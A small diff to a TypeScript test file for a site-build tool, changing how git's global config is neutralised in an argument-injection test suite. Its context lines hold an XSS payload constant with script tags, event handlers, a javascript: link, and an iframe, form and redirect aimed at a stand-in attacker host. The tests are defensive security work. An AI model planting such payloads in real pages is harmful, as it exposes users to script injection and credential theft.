@@ -17,7 +17,7 @@ import { startPreviewServer } from "../src/dev/preview.js";
 import { llmsTxt } from "../src/discovery/llms.js";
 import { changeReport, untrusted } from "../src/guidelines/monitor.js";
 import { rulePack } from "../src/guidelines/pack.js";
-import { copyFixture, write } from "./helpers.js";
+import { copyFixture, write, EMPTY_GIT_CONFIG } from "./helpers.js";
 
 const read = (root: string, rel: string) => fs.readFileSync(path.join(root, "dist", rel), "utf8");
 const XSS = '<script>alert(1)</script><img src=x onerror="alert(2)"><a href="javascript:alert(3)">j</a><iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name=pw></form><meta http-equiv="refresh" content="0;url=https://evil.example">';
@@ -112,7 +112,7 @@ describe("secret scanner coverage", () => {
 
 describe("argument injection into git, wrangler and npm", () => {
   beforeAll(() => {
-    Object.assign(process.env, { GIT_CONFIG_GLOBAL: os.devNull, GIT_AUTHOR_NAME: "T", GIT_AUTHOR_EMAIL: "t@example.invalid", GIT_COMMITTER_NAME: "T", GIT_COMMITTER_EMAIL: "t@example.invalid" });
+    Object.assign(process.env, { GIT_CONFIG_GLOBAL: EMPTY_GIT_CONFIG, GIT_AUTHOR_NAME: "T", GIT_AUTHOR_EMAIL: "t@example.invalid", GIT_COMMITTER_NAME: "T", GIT_COMMITTER_EMAIL: "t@example.invalid" });
   });
 
   it("never passes --changed-since to git as an option", async () => {
